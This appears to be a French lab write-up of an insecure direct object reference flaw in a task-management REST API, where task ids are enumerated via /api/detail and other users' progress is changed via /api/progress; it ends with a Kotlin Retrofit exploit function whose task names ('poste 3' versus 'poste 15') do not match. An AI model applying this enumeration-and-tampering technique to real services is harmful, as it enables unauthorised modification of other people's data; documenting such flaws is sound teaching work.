# faille.md

## Faille de sécurité exploitée

### Contexte
L'application offre une API REST pour gérer des tâches, notamment :
- `/api/detail/{id}` pour consulter les détails d'une tâche.
- `/api/progress/{id}/{valeur}` pour modifier le pourcentage de progression d'une tâche.

### Description de la faille
L’API `/api/progress/{id}/{valeur}` ne faisait **aucune vérification** pour s’assurer que l’utilisateur connecté était bien le **propriétaire** de la tâche qu’il essayait de modifier. Par conséquent, il suffisait de connaître l’identifiant (`id`) d'une tâche appartenant à un autre utilisateur pour modifier sa progression.

### Étapes pour exploiter la faille

1. **Connexion avec un utilisateur X (ex. : bob).**
2. **Requête GET sur `/api/detail/{id}`** (en essayant des identifiants de tâches comme 1, 2, 3...) :
   - Permet de récupérer les détails de **toutes les tâches**, même celles d’autres utilisateurs.
3. **Une fois une tâche trouvée appartenant à un autre utilisateur**, envoyer une requête :




//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
fun updatePoste15To62(service: Service) {
    service.getHomeItems().enqueue(object : Callback<List<HomeItemResponse>> {
        override fun onResponse(
            call: Call<List<HomeItemResponse>>,
            response: Response<List<HomeItemResponse>>
        ) {
            if (response.isSuccessful) {
                val tasks = response.body()
                val poste15Task = tasks?.find { it.name == "poste 3" }

                if (poste15Task != null) {
                    val taskId = poste15Task.id
                    service.updateTaskProgress(taskId, 62).enqueue(object : Callback<Void> {
                        override fun onResponse(call: Call<Void>, response: Response<Void>) {
                            if (response.isSuccessful) {
                                println("✅ Task 'poste 15' updated to 62%")
                            } else {
                                println("❌ Failed to update progress")
                            }
                        }

                        override fun onFailure(call: Call<Void>, t: Throwable) {
                            println("❌ Error updating progress: ${t.message}")
                        }
                    })
                } else {
                    println("❌ Task named 'poste 3' not found")
                }
            } else {
                println("❌ Failed to fetch tasks")
            }
        }

        override fun onFailure(call: Call<List<HomeItemResponse>>, t: Throwable) {
            println("❌ Error fetching tasks: ${t.message}")
        }
    })
}